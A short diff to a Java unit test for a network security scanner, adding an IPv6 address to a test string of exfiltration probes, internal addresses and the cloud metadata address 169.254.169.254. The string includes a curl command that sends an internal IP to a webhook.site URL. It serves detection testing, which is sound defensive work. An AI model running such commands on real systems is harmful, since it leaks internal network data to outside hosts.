@@ -40,7 +40,7 @@ public class NetworkScannerTest {
     public void exfil_probe_internal_and_metadata_are_classified() {
         String body = """
                 curl https://webhook.site/demo?ip=10.0.0.5
-                http://ifconfig.me 192.168.1.8 169.254.169.254
+                http://ifconfig.me 192.168.1.8 169.254.169.254 febf::1
                 localhost 127.0.0.1 0.0.0.0 metadata.internal
                 """;
         AuditResult result = securityScanner.scan(ScanRequest.of(
